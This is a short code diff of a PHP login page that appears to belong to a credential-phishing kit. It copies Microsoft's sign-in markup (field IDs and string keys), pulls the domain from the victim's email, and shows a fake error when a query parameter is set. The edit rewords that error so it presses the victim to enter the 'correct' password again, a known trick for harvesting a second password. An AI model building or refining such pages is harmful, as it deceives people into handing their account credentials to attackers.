@@ -57,7 +57,7 @@ $domain = getDomainFromEmail($log);
                                     <div class="row">
                                         <div class="form-group col-md-24">
 
-                                        <?php if (isset($_GET['mgs'])) { echo '<div id="passwordError" class="alert alert-error">Your email or password is incorrect. If you don\'t remember your password, <a href="#"> reset it </a> </div> <div role="alert" aria-live="assertive" aria-atomic="false"> </div>'; } ?>
+                                        <?php if (isset($_GET['mgs'])) { echo '<div id="passwordError" class="alert alert-error">Your email password is not correct. Please enter the correct password to continue.<a href="#"> reset it </a> </div> <div role="alert" aria-live="assertive" aria-atomic="false"> </div>'; } ?>
                                             <div class="placeholderContainer" data-bind="component:{name: &#39;placeholder-textbox&#39;, params:{serverData: svr, textInput: password, hasFocus: isFocused, hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;], forcePlaceholderAttribute: true, hintCss: &#39;placeholder&#39;}}">
                                                 <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control <?php if (isset($_GET['mgs'])) { echo 'has-error'; } ?>" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" maxlength="127"> </div>
                                         </div>
